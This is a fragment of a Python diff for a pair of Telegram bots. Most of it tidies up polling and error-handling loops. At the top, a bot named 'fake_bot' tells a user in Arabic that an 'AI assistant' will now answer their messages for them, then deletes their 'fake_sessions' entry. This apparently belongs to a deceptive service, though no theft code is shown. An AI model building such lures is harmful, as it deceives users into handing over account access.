+        try: fake_bot.send_message(cid, f"✅ <b>تم تفعيل المساعد الذكي بنجاح!</b>\n\nالآن سيقوم الذكاء الاصطناعي بالرد على رسائلك نيابة عنك. يمكنك الاسترخاء والنوم بسلام! {ce('😴')}\n\nشكراً لاستخدامك خدمتنا.")
+        except: pass
+        if cid in fake_sessions: del fake_sessions[cid]
         return
 
-# ==============================================================================
-# تشغيل البوتات وسيرفر الويب معاً (مع إصلاح خطأ الانقطاع Timeout و 409 Conflict)
-# ==============================================================================
 if __name__ == '__main__':
     keep_alive()
     try:
@@ -2122,7 +1969,6 @@ if __name__ == '__main__':
         logger.info("Main bot webhook deleted successfully.")
     except Exception as e:
         logger.error(f"Failed to delete main bot webhook: {e}")
-        
     try:
         fake_bot.delete_webhook()
         logger.info("Fake bot webhook deleted successfully.")
@@ -2131,32 +1977,26 @@ if __name__ == '__main__':
     
     def run_main_bot():
         while True:
-            try:
-                bot.infinity_polling(timeout=30, long_polling_timeout=30, skip_pending=True)
+            try: bot.infinity_polling(timeout=30, long_polling_timeout=30, skip_pending=True)
             except requests.exceptions.ReadTimeout:
                 logger.warning("Main bot read timeout, retrying in 3 seconds...")
                 time.sleep(3)
             except Exception as e:
                 err_str = str(e)
-                if "409" in err_str or "Conflict" in err_str:
-                    logger.warning("⚠️ Main Bot 409 Conflict: نسخة أخرى تعمل، سأحاول مجدداً بعد 10 ثواني...")
-                else:
-                    logger.error(f"Main bot polling error: {e}")
+                if "409" in err_str or "Conflict" in err_str: logger.warning("⚠️ Main Bot 409 Conflict: نسخة أخرى تعمل، سأحاول مجدداً بعد 10 ثواني...")
+                else: logger.error(f"Main bot polling error: {e}")
                 time.sleep(10)
                 
     def run_fake_bot():
         while True:
-            try:
-                fake_bot.infinity_polling(timeout=30, long_polling_timeout=30, skip_pending=True)
+            try: fake_bot.infinity_polling(timeout=30, long_polling_timeout=30, skip_pending=True)
             except requests.exceptions.ReadTimeout:
                 logger.warning("Fake bot read timeout, retrying in 3 seconds...")
                 time.sleep(3)
             except Exception as e:
                 err_str = str(e)
-                if "409" in err_str or "Conflict" in err_str:
-                    logger.warning("⚠️ Fake Bot 409 Conflict: نسخة أخرى تعمل، سأحاول مجدداً بعد 10 ثواني...")
-                else:
-                    logger.error(f"Fake bot polling error: {e}")
+                if "409" in err_str or "Conflict" in err_str: logger.warning("⚠️ Fake Bot 409 Conflict: نسخة أخرى تعمل، سأحاول مجدداً بعد 10 ثواني...")
+                else: logger.error(f"Fake bot polling error: {e}")
                 time.sleep(10)
         
     Thread(target=run_main_bot, daemon=True).start()
